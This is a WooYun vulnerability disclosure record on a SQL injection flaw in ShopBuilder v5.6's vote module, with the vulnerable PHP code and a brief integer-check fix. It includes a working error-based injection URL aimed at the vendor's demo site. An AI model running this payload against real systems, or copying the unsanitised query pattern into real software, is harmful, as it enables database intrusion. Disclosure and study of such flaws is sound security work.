{"id": 55390, "wybug_id": "wooyun-2014-061113", "wybug_title": "shop-builder报错注入1", "wybug_corp": "ShopBuilder", "wybug_author": "kk_skipper", "wybug_date": "2014-05-20 12:49", "wybug_open_date": "2014-08-18 12:50", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： shop-builder设计不当存在SQL注入漏洞 详细说明：  官方演示程序：http://cn.shop-builder.cn/注入exp：http://cn.shop-builder.cn/main.php?m=vote&s=votePost:type=special&vote[]=123) and extractvalue(rand(),concat(0x7e,version()))-- &cid=123ShoplBuilder_v5.6\\module\\vote\\vote.php官网测试：\n\n代码：\n<?php #echo 123;exit;include_once(\"includes/global.php\");//=====================================$_GET['id']*=1;if($_POST['type']==\"special\"){\t#var_dump($_POST['vote']);exit;\t$votes=implode(',',$_POST['vote']); #print_r($votes);exit;\t$url=$votes.\"&t=sp&cid=$_POST[cid]\";}else{\tif(!empty($_GET['id']))\t{\t\t$sql=\"select vote from \".NEWSD.\" where nid='$_GET[id]'\";\t\t$db->query($sql);\t\t$votes=substr($db->fetchField('vote'),0,-1);\t\t$url=$_GET['id'];\t}\telseif(!empty($_POST['vid']))\t{\t\t$votes=implode(',',$_POST['vid']);\t\t$url=\"&vid=$votes\";\t}\telse\t{\t\tdie(\"forbiden\");\t}}if(!empty($votes)){\t$sql=\"select * from \".NEWSVOTE.\" where id in ($votes)\";\t #echo $sql;exit;\t#var_dump($db);exit;\t$db->query($sql);\t#echo $sql;\t$vote=$db->getRows();...\n   漏洞证明：  见详情   修复方案：  控制post输入，判断是否为整形   版权声明：转载请注明来源 kk_skipper@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}